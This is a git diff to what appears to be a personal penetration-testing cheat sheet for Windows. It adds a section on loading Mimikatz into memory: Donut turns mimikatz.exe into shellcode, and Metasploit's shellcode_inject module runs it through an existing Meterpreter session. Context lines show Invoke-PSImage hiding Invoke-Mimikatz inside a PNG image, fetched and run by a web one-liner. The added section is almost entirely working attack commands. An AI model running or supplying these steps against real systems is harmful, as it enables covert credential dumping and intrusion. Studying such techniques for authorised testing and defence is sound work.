@@ -68,6 +68,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-evilwinrm">EvilWinRM</a>
       * <a href="#-GetVulnerableGPO">GetVulnerableGPO</a>
       * <a href="#-invoke--psimage">Invoke-PSImage</a>
+      * <a href="#-invoke--psimage">Meterpreter + Donut - Shellcode Injection .NET</a>
    * <a href="#privilege-escalation">Privilege Escalation</a>
       * <a href="#-basics-1">Basics</a>
       * <a href="#-powerupps1-sometimes-a-quick-win">PowerUp.ps1 (Sometimes a Quick Win)</a>
@@ -1030,6 +1031,24 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\ki
 PS>Import-Module .\Invoke-PSImage.ps1
 PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest
    [Oneliner to execute from the web]
+
+```
+
+
+
+#### [](#header-4) Meterpreter + Donut - Shellcode Injection .NET
+
+```powershell
+#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html
+
+A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!
+
+donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.bin
+
+use post/windows/manage/shellcode_inject
+set SHELLCODE /tmp/payload.bin
+set SESSION 1
+run
 
 ```
 
